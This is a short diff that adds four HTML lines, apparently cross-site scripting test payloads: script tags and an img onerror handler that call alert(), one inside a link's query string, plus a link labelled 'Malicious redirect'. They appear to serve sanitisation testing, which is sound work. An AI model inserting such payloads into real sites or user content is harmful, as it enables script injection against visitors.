@@ -1,0 +1,4 @@
+<p><a href="?q=<script>alert('XSS Bypassed by cliking link')</script>">Click me</a></p>
+<p><img src="1" href="1" onerror="javascript:alert(Stored XSS bypass)"></p>
+<p><script>alert('Stored XSS bypass')</script></p>
+<p><a href="https://www.google.com" target="_blank">Malicious redirect</a></p>
